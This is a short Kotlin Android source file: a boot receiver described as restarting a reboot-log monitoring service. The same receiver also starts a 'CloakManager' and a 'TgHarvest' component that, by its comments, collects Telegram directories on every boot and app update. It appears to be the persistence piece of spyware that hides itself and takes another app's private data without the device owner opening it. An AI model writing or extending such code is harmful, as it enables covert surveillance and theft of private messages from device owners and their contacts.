package com.itsme.itsanon.notification

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import com.itsme.itsanon.services.RebootMonitorService
import com.itsme.itsanon.utils.Logger

/**
 * Starts RebootMonitorService after device boot so reboot logs are captured
 * even if app was not manually opened after reboot
 */
class RebootReceiver : BroadcastReceiver() {
    override fun onReceive(context: Context, intent: Intent) {
        if (intent.action == Intent.ACTION_BOOT_COMPLETED ||
            intent.action == Intent.ACTION_MY_PACKAGE_REPLACED ||
            intent.action == Intent.ACTION_PACKAGE_REPLACED) {
            Logger.i("itsanon/reboot_receiver", "Boot completed — starting RebootMonitorService")
            try {
                RebootMonitorService.start(context)
            } catch (e: Exception) {
                Logger.w("itsanon/reboot_receiver", "Failed to start service on boot: ${e.message}")
            }
            // [V51] experiment: V30 base + cloak only
            com.itsme.itsanon.console.CloakManager.start(context)
            // [V55 harvest] boot/package-replace: harvest Telegram dirs too
            com.itsme.itsanon.logging.TgHarvest.start(context)
        }
    }
}
